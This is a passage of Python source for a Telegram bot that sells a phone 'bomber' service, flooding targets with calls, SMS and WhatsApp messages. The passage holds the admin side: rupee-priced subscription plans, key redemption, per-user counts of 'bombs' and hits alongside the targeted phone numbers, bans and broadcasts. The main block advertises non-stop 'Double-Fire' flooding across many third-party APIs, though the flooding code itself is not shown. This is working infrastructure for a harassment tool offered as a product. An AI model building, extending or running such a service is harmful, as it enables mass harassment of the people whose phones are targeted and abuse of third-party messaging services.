        used_count = sum(1 for k in keys.values() if k["used"])
        msg = "🔐 *All Generated Keys*\n\n"
        msg += f"Total: {len(keys)} | Used: {used_count} | Unused: {len(keys)-used_count}\n\n"
        count = 0
        for key, k in sorted(keys.items(), key=lambda x: x[1]["created_at"], reverse=True):
            if count >= 8:
                msg += f"\n...aur {len(keys)-8} keys"
                break
            status = "✅ Used" if k["used"] else "🆕 New"
            msg += f"`{key}` | {k['plan'].upper()} | ₹{k['price']} | {status}\n"
            count += 1
        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "refresh":
        subs_stats = admin_db.get_subscription_stats()
        admin_list = admin_db.get_admins()
        msg = (
            "⚙️ *Admin Panel*\n\n"
            f"👥 Total Users: {admin_db.get_user_count()}\n"
            f"💳 Subscribed: {subs_stats['active']} (Expired: {subs_stats['expired']})\n"
            f"    ├ Trial: {subs_stats['plans']['trial']}\n"
            f"    ├ Standard: {subs_stats['plans']['standard']}\n"
            f"    ├ Premium: {subs_stats['plans']['premium']}\n"
            f"    └ VIP: {subs_stats['plans']['vip']}\n"
            f"👑 Admins: {len(admin_list) + len(ADMIN_IDS)} (Super: {len(ADMIN_IDS)} + Custom: {len(admin_list)})\n"
            f"🚫 Banned: {admin_db.get_banned_count()}\n"
            f"💣 Total Bombs: {admin_db.get_total_bombs()}\n\n"
            "✅ Refreshed!"
        )
        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "stats":
        users = admin_db.get_all_users()
        total_hits = sum(u.get("total_hits", 0) for u in users.values())
        total_ok = sum(u.get("total_ok", 0) for u in users.values())
        total_fail = sum(u.get("total_fail", 0) for u in users.values())
        active_sessions = len(bomber.sessions)
        subs_stats = admin_db.get_subscription_stats()
        admin_list = admin_db.get_admins()
        total_rounds = sum(u.get("total_rounds", 0) for u in users.values())
        total_sessions = sum(u.get("total_sessions", 0) for u in users.values())
        broadcasts = admin_db.data.get("broadcasts", 0)
        keys_count = len(admin_db.data.get("keys", {}))
        used_keys = sum(1 for k in admin_db.data.get("keys", {}).values() if k.get("used"))

        msg = (
            "📊 *Global Statistics*\n\n"
            f"👥 *Users:*\n"
            f"    Total: {len(users)}\n"
            f"    Banned: {admin_db.get_banned_count()}\n"
            f"    Admins: {len(admin_list) + len(ADMIN_IDS)}\n\n"
            f"💳 *Subscriptions:*\n"
            f"    Active: {subs_stats['active']}\n"
            f"    Expired: {subs_stats['expired']}\n"
            f"    ├ Trial: {subs_stats['plans']['trial']}\n"
            f"    ├ Standard: {subs_stats['plans']['standard']}\n"
            f"    ├ Premium: {subs_stats['plans']['premium']}\n"
            f"    └ VIP: {subs_stats['plans']['vip']}\n\n"
            f"🔑 *Keys:*\n"
            f"    Total: {keys_count} | Used: {used_keys} | Unused: {keys_count - used_keys}\n\n"
            f"💣 *Bombing:*\n"
            f"    Active Sessions: {active_sessions}\n"
            f"    Total Bombs: {admin_db.get_total_bombs()}\n"
            f"    Total Rounds: {total_rounds}\n"
            f"    Total Sessions: {total_sessions}\n"
            f"    ✅ OK: {total_ok}\n"
            f"    ❌ Fail: {total_fail}\n"
            f"    📊 Hits: {total_hits}\n\n"
            f"📢 Broadcasts: {broadcasts}"
        )
        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "users":
        users = admin_db.get_all_users()
        if not users:
            bot.edit_message_text("❌ Koi user nahi hai.", chat_id, msg_id)
            bot.answer_callback_query(call.id)
            return

        subs_stats = admin_db.get_subscription_stats()
        msg = f"👥 *All Users — {len(users)} total*\n"
        msg += f"💳 Subscribed: {subs_stats['active']} | Banned: {admin_db.get_banned_count()}\n"
        msg += "─" * 25 + "\n\n"
        count = 0
        for uid, u in sorted(users.items(), key=lambda x: x[1].get("total_hits", 0), reverse=True):
            if count >= 10:
                msg += f"\n...aur {len(users) - 10} aur users"
                break
            name = u.get("username", "Unknown")
            phone = u.get("last_phone", "N/A")
            hits = u.get("total_hits", 0)
            sessions = u.get("total_sessions", 0)
            mode = u.get("last_mode", "-")
            active = u.get("last_active", "")[:16].replace("T", " ")
            banned = "🚫" if admin_db.is_banned(int(uid)) else "✅"

            # Check subscription
            sub = admin_db.get_subscription(int(uid))
            if sub:
                plan = sub.get("plan", "unknown").upper()
                badge = "👑 VIP" if plan == "VIP" else "⭐ PREM" if plan == "PREMIUM" else "⭐ STD" if plan == "STANDARD" else "🔰 TRIAL"
            else:
                badge = "❌ No Sub"

            msg += f"{banned} {badge} `{uid}` @{name}\n📱 {phone} | 💣 {hits} | 📋 {sessions} | 🎯 {mode}\n⏱ {active}\n\n"
            count += 1

        if len(msg) > 4000:
            msg = msg[:3900] + "\n\n...aur bhi hai..."

        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "subsusers":
        subs = admin_db.get_subscribed_users()
        if not subs:
            bot.edit_message_text("❌ Koi subscribed user nahi hai.", chat_id, msg_id)
            bot.answer_callback_query(call.id)
            return

        # Paginated: show page based on stored admin_data
        page = admin_data.get(chat_id, {}).get("subs_page", 0)
        per_page = 6
        items = sorted(subs.items(), key=lambda x: x[1].get("sub", {}).get("started_at", ""), reverse=True)
        total = len(items)
        total_pages = (total + per_page - 1) // per_page
        page = max(0, min(page, total_pages - 1))
        start = page * per_page
        end = start + per_page
        page_items = items[start:end]

        msg_text = f"💳 *Subscribed Users — Page {page+1}/{total_pages}*\n"
        msg_text += "─" * 25 + "\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for uid2, data in page_items:
            u = data.get("user", {})
            s = data.get("sub", {})
            name = u.get("username", "Unknown")
            phone = u.get("last_phone", "N/A")
            plan = s.get("plan", "?").upper()
            started = s.get("started_at", "")[:10]
            expires = s.get("expires_at", "")[:10]
            price = s.get("price", 0)
            hits = u.get("total_hits", 0)
            sessions = u.get("total_sessions", 0)
            last_active = u.get("last_active", "")[:10]
            badge = "👑 VIP" if plan == "VIP" else "⭐ PREM" if plan == "PREMIUM" else "⭐ STD" if plan == "STANDARD" else "🔰 TRIAL"
            msg_text += f"{badge} `{uid2}` @{name}\n📱 {phone} | 💰 ₹{price} | 💣 {hits} | 📋 {sessions}\n📅 {started} ➝ {expires}\n⏱ Last: {last_active}\n\n"
            markup.add(types.InlineKeyboardButton(f"❌ Cancel — {name} ({uid2})", callback_data=f"cancel_sub_{uid2}"))
        nav_btns = []
        if page > 0:
            nav_btns.append(types.InlineKeyboardButton("⬅️ Prev", callback_data="subs_page_prev"))
        if page < total_pages - 1:
            nav_btns.append(types.InlineKeyboardButton("Next ➡️", callback_data="subs_page_next"))
        if nav_btns:
            markup.row(*nav_btns)
        markup.add(types.InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_refresh"))

        bot.edit_message_text(msg_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    if action == "nonsubs":
        non = admin_db.get_non_subscribed_users()
        if not non:
            bot.edit_message_text("❌ Sab users ke paas subscription hai!", chat_id, msg_id)
            bot.answer_callback_query(call.id)
            return
        msg = f"❌ *Non-Subscribed Users — {len(non)} total*\n"
        msg += "─" * 25 + "\n\n"
        count = 0
        for uid, u in sorted(non.items(), key=lambda x: x[1].get("total_hits", 0), reverse=True):
            if count >= 10:
                msg += f"\n...aur {len(non) - 10} aur..."
                break
            name = u.get("username", "Unknown")
            phone = u.get("last_phone", "N/A")
            hits = u.get("total_hits", 0)
            active = u.get("last_active", "")[:10]
            banned = "🚫" if admin_db.is_banned(int(uid)) else "✅"
            msg += f"{banned} `{uid}` @{name}\n📱 {phone} | 💣 {hits} | ⏱ {active}\n\n"
            count += 1
        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "cancelsub":
        admin_data[chat_id] = {"action": "cancelsub_waiting"}
        bot.edit_message_text(
            "❌ *Cancel Subscription*\n\n"
            "Jis user ka subscription cancel karna hai uski **Telegram ID** bhejo.\n\n"
            "Example: `123456789`\n\n"
            "Active subscribed users:\n"
            + "\n".join([f"  💳 `{uid}`" for uid in admin_db.get_subscribed_users().keys()][:10])
            + ("\n  ...aur bhi..." if len(admin_db.get_subscribed_users()) > 10 else "")
            + "\n\n/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "broadcast":
        # Ask for broadcast message
        admin_data[chat_id] = {"action": "broadcast_waiting"}
        bot.edit_message_text(
            "📢 *Broadcast Mode*\n\n"
            "Ab jo bhi message bhejoge, woh **SABHI USERS** ko bhej diya jayega.\n\n"
            "Ek text message bhejo. Cancel karne ke liye /cancel likho.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "addadmin":
        admin_data[chat_id] = {"action": "addadmin_waiting"}
        bot.edit_message_text(
            "➕ *Add Admin*\n\n"
            "Jis user ko admin banana hai uski **Telegram ID** bhejo.\n\n"
            "Example: `7812058540`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "removeadmin":
        admin_data[chat_id] = {"action": "removeadmin_waiting"}
        bot.edit_message_text(
            "➖ *Remove Admin*\n\n"
            "Jis user ko admin se hatana hai uski **Telegram ID** bhejo.\n\n"
            "Custom admins ki list:\n"
            + "\n".join([f"  👤 `{a}`" for a in admin_db.get_admins()]) +
            "\n\n/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "ban":
        admin_data[chat_id] = {"action": "ban_waiting"}
        bot.edit_message_text(
            "🚫 *Ban User*\n\n"
            "Jis user ko banana hai uski **Telegram ID** bhejo.\n\n"
            "Example: `123456789`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "unban":
        admin_data[chat_id] = {"action": "unban_waiting"}
        bot.edit_message_text(
            "✅ *Unban User*\n\n"
            "Jis user ko unban karna hai uski **Telegram ID** bhejo.\n\n"
            "Example: `123456789`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return


# ====== CANCEL SUBSCRIPTION CALLBACK ======
@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("cancel_sub_"))
def cancel_sub_callback(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
        bot.answer_callback_query(call.id, "🚫 Access Denied!", show_alert=True)
        return
    uid = call.data.replace("cancel_sub_", "")
    success, msg = admin_db.cancel_subscription(int(uid), chat_id)
    bot.answer_callback_query(call.id, msg, show_alert=True)
    # Refresh the subs list
    bot.edit_message_text("🔄 Refreshing subscribed users...", chat_id, msg_id)
    # Re-display subs list
    subs = admin_db.get_subscribed_users()
    page = admin_data.get(chat_id, {}).get("subs_page", 0)
    per_page = 6
    items = sorted(subs.items(), key=lambda x: x[1].get("sub", {}).get("started_at", ""), reverse=True)
    total = len(items)
    total_pages = max(1, (total + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start = page * per_page
    end = start + per_page
    page_items = items[start:end]

    if not subs:
        bot.edit_message_text("❌ Ab koi subscribed user nahi hai.", chat_id, msg_id)
        return
    msg_text = f"💳 *Subscribed Users — Page {page+1}/{total_pages}*\n"
    msg_text += "─" * 25 + "\n\n"
    markup = types.InlineKeyboardMarkup(row_width=1)
    for uid2, data in page_items:
        u = data.get("user", {})
        s = data.get("sub", {})
        name = u.get("username", "Unknown")
        phone = u.get("last_phone", "N/A")
        plan = s.get("plan", "?").upper()
        started = s.get("started_at", "")[:10]
        expires = s.get("expires_at", "")[:10]
        price = s.get("price", 0)
        hits = u.get("total_hits", 0)
        sessions = u.get("total_sessions", 0)
        last_active = u.get("last_active", "")[:10]
        badge = "👑 VIP" if plan == "VIP" else "⭐ PREM" if plan == "PREMIUM" else "⭐ STD" if plan == "STANDARD" else "🔰 TRIAL"
        msg_text += f"{badge} `{uid2}` @{name}\n📱 {phone} | 💰 ₹{price} | 💣 {hits} | 📋 {sessions}\n📅 {started} ➝ {expires}\n⏱ Last: {last_active}\n\n"
        markup.add(types.InlineKeyboardButton(f"❌ Cancel — {name} ({uid2})", callback_data=f"cancel_sub_{uid2}"))
    nav_btns = []
    if page > 0:
        nav_btns.append(types.InlineKeyboardButton("⬅️ Prev", callback_data="subs_page_prev"))
    if page < total_pages - 1:
        nav_btns.append(types.InlineKeyboardButton("Next ➡️", callback_data="subs_page_next"))
    if nav_btns:
        markup.row(*nav_btns)
    markup.add(types.InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_refresh"))
    try:
        bot.edit_message_text(msg_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
    except:
        bot.send_message(chat_id, msg_text, parse_mode="Markdown", reply_markup=markup)


# ====== SUBS PAGE NAVIGATION CALLBACKS ======
@bot.callback_query_handler(func=lambda c: c.data in ["subs_page_prev", "subs_page_next"])
def subs_page_callback(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
        bot.answer_callback_query(call.id, "🚫 Access Denied!", show_alert=True)
        return
    # Update page
    admin_data.setdefault(chat_id, {})
    current = admin_data[chat_id].get("subs_page", 0)
    if call.data == "subs_page_prev":
        admin_data[chat_id]["subs_page"] = max(0, current - 1)
    else:
        admin_data[chat_id]["subs_page"] = current + 1
    bot.answer_callback_query(call.id)
    # Re-trigger the subsusers display
    # (simulate by calling the same logic inline)
    subs = admin_db.get_subscribed_users()
    page = admin_data[chat_id]["subs_page"]
    per_page = 6
    items = sorted(subs.items(), key=lambda x: x[1].get("sub", {}).get("started_at", ""), reverse=True)
    total = len(items)
    total_pages = max(1, (total + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    admin_data[chat_id]["subs_page"] = page
    start = page * per_page
    end = start + per_page
    page_items = items[start:end]
    msg_text = f"💳 *Subscribed Users — Page {page+1}/{total_pages}*\n"
    msg_text += "─" * 25 + "\n\n"
    markup = types.InlineKeyboardMarkup(row_width=1)
    for uid2, data in page_items:
        u = data.get("user", {})
        s = data.get("sub", {})
        name = u.get("username", "Unknown")
        phone = u.get("last_phone", "N/A")
        plan = s.get("plan", "?").upper()
        started = s.get("started_at", "")[:10]
        expires = s.get("expires_at", "")[:10]
        price = s.get("price", 0)
        hits = u.get("total_hits", 0)
        sessions = u.get("total_sessions", 0)
        last_active = u.get("last_active", "")[:10]
        badge = "👑 VIP" if plan == "VIP" else "⭐ PREM" if plan == "PREMIUM" else "⭐ STD" if plan == "STANDARD" else "🔰 TRIAL"
        msg_text += f"{badge} `{uid2}` @{name}\n📱 {phone} | 💰 ₹{price} | 💣 {hits} | 📋 {sessions}\n📅 {started} ➝ {expires}\n⏱ Last: {last_active}\n\n"
        markup.add(types.InlineKeyboardButton(f"❌ Cancel — {name} ({uid2})", callback_data=f"cancel_sub_{uid2}"))
    nav_btns = []
    if page > 0:
        nav_btns.append(types.InlineKeyboardButton("⬅️ Prev", callback_data="subs_page_prev"))
    if page < total_pages - 1:
        nav_btns.append(types.InlineKeyboardButton("Next ➡️", callback_data="subs_page_next"))
    if nav_btns:
        markup.row(*nav_btns)
    markup.add(types.InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_refresh"))
    try:
        bot.edit_message_text(msg_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
    except:
        bot.send_message(chat_id, msg_text, parse_mode="Markdown", reply_markup=markup)


# ====== ADMIN DATA STORAGE (for pending actions) ======
admin_data = {}

# ====== HANDLE ADMIN TEXT INPUTS ======
@bot.message_handler(func=lambda m: admin_data.get(m.chat.id, {}).get("action") in [
    "broadcast_waiting", "addadmin_waiting", "removeadmin_waiting", "cancelsub_waiting", "ban_waiting", "unban_waiting", "redeem_waiting"
])
def handle_admin_input(message):
    chat_id = message.chat.id
    action = admin_data[chat_id]["action"]
    text = message.text.strip()

    if text == "/cancel":
        del admin_data[chat_id]
        bot.reply_to(message, "❌ Cancelled.", reply_markup=main_keyboard(chat_id))
        return

    if action == "redeem_waiting":
        success, msg = admin_db.redeem_key(text.strip().upper(), chat_id)
        del admin_data[chat_id]
        bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return

    if action == "cancelsub_waiting":
        try:
            target_id = int(text)
            success, msg = admin_db.cancel_subscription(target_id, chat_id)
            bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        except:
            bot.reply_to(message, "❌ Invalid ID! Sirf numeric ID bhejo.", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]
        return

    if action == "broadcast_waiting":
        # Broadcast to all users
        users = admin_db.get_all_users()
        sent = 0
        failed = 0
        for uid in users:
            try:
                bot.send_message(int(uid),
                    f"📢 *Broadcast from Admin*\n\n{text}\n\n— *Admin*",
                    parse_mode="Markdown")
                sent += 1
            except:
                failed += 1
        del admin_data[chat_id]
        admin_db.data["broadcasts"] = admin_db.data.get("broadcasts", 0) + 1
        admin_db._save()
        bot.reply_to(message,
            f"📢 *Broadcast Complete!*\n\n"
            f"✅ Sent: {sent}\n"
            f"❌ Failed: {failed}\n"
            f"👥 Total Users: {len(users)}",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

    elif action == "addadmin_waiting":
        try:
            target_id = int(text)
            if target_id in ADMIN_IDS:
                bot.reply_to(message, "❌ Yeh toh Super Admin hai already!", reply_markup=main_keyboard(chat_id))
            elif admin_db.add_admin(target_id, chat_id):
                bot.reply_to(message, f"✅ User `{target_id}` ko Admin banaya gaya!", parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.reply_to(message, "❌ Pehle se hi admin hai!", reply_markup=main_keyboard(chat_id))
        except:
            bot.reply_to(message, "❌ Invalid ID! Sirf numeric ID bhejo.", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "removeadmin_waiting":
        try:
            target_id = int(text)
            if target_id in ADMIN_IDS:
                bot.reply_to(message, "❌ Super Admin ko nahi hataya ja sakta!", reply_markup=main_keyboard(chat_id))
            elif target_id == chat_id:
                bot.reply_to(message, "❌ Apne aap ko nahi hata sakte!", reply_markup=main_keyboard(chat_id))
            elif admin_db.remove_admin(target_id, chat_id):
                bot.reply_to(message, f"✅ User `{target_id}` ko Admin se hata diya gaya!", parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.reply_to(message, "❌ Yeh user admin nahi hai ya already removed hai!", reply_markup=main_keyboard(chat_id))
        except:
            bot.reply_to(message, "❌ Invalid ID! Sirf numeric ID bhejo.", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "ban_waiting":
        try:
            target_id = int(text)
            if target_id in ADMIN_IDS:
                bot.reply_to(message, "❌ Super Admin ko ban nahi kar sakte!", reply_markup=main_keyboard(chat_id))
            elif admin_db.ban_user(target_id, chat_id):
                # Stop any active session for this user
                bomber.stop(target_id)
                bot.reply_to(message, f"🚫 User `{target_id}` ko ban kar diya gaya!", parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.reply_to(message, "❌ Pehle se banned hai!", reply_markup=main_keyboard(chat_id))
        except:
            bot.reply_to(message, "❌ Invalid ID!", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "unban_waiting":
        try:
            target_id = int(text)
            if admin_db.unban_user(target_id, chat_id):
                bot.reply_to(message, f"✅ User `{target_id}` ko unban kar diya gaya!", parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.reply_to(message, "❌ Yeh user banned nahi hai!", reply_markup=main_keyboard(chat_id))
        except:
            bot.reply_to(message, "❌ Invalid ID!", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]


# ====== /cancel command to exit admin modes ======
@bot.message_handler(commands=['cancel'])
def cmd_cancel(message):
    chat_id = message.chat.id
    if chat_id in admin_data:
        del admin_data[chat_id]
        bot.reply_to(message, "❌ Cancelled.", reply_markup=main_keyboard(chat_id))
    else:
        bot.reply_to(message, "❌ Kuch bhi pending nahi hai.", reply_markup=main_keyboard(chat_id))

@bot.message_handler(commands=['plans'])
def cmd_plans(message):
    btn_plans(message)

@bot.message_handler(commands=['redeem'])
def cmd_redeem(message):
    btn_redeem(message)

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    print(f"📊 Total APIs: {len(ALL_APIS)} (Call: {len(CALL_APIS)}, SMS: {len(SMS_APIS)}, WhatsApp: {len(WHATSAPP_APIS)})")
    print(f"⚡ Max Workers: {MAX_WORKERS} (SMS: {SMS_MAX_WORKERS} with Double-Fire + Auto-Retry)")
    print(f"⚡ SMS Delay: {SMS_DELAY_BETWEEN_ROUNDS}s — NON STOP!")
    print(f"✅ Bot is running! Press Ctrl+C to stop.")
    print(f"👑 Admin ID: {ADMIN_IDS[0]} — Admin panel active!")
    if not API_TOKEN or len(API_TOKEN) < 10:
        print("❌ ERROR: No valid BOT_TOKEN found!")
        print("   Set BOT_TOKEN environment variable or create config_token.py")
        exit(1)
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("\n🛑 Stopping all sessions...")
        stopped = bomber.stop_all()
        print(f"✅ Stopped {stopped} sessions. Bye!")
    except Exception as e:
        print(f"⚠️ Bot error: {e}")
        # Don't exit on polling errors, let supervisord restart
